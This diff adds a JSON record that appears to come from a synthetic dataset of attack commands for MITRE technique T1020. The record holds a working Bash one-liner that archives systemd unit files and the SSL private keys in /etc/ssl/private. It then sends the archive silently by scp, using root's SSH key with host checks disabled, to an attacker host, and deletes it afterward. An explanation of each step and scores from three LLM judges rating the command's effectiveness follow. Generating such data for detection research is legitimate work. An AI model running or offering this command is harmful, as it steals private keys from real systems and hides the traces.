@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); tar -czf /tmp/svc_keys_${ts}.tgz /etc/systemd/system /lib/systemd/system /etc/ssl/private >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/svc_keys_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/svc/ >/dev/null 2>&1 && rm -f /tmp/svc_keys_${ts}.tgz",
+  "explanation": "Aggregates systemd service units and private SSL keys for credential and service intelligence, then exfiltrates via scp silently with cleanup.",
+  "rationale_steps": [
+    "Create a single archive from service unit directories and private key storage.",
+    "Use scp with -q and -C for quiet, compressed, non-interactive transfer.",
+    "Disable host key checks to avoid interactive trust prompts.",
+    "Remove the archive locally after successful exfiltration to reduce traceability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-6eab8574",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash one-liner with valid flags, balanced substitutions, proper separators, and redirects.",
+        "semantic_score": 3,
+        "semantic_justification": "It automates packaging and exfiltration via scp consistent with T1020, but is likely to fail without root access to /etc/ssl/private and /root/.ssh/id_rsa and if the remote path does not exist.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T03:47:25.823996Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags, appropriate command separators (&&), and correct escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by collecting sensitive files (systemd service configurations and SSL private keys), compressing them with a timestamp, securely transferring them via SCP to a remote server, and cleaning up traces afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:47:28.900290Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced elements, valid flags for all commands (tar, scp, rm), and proper use of command separators and redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's structure and choice of tools are perfectly aligned with automated exfiltration (T1020), the stated 'Privilege: None' contradicts the ability to read the specified sensitive directories and use the root's SSH key, making the claimed aggregation and exfiltration of specific content highly implausible and likely to fail.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:50:51.549229Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
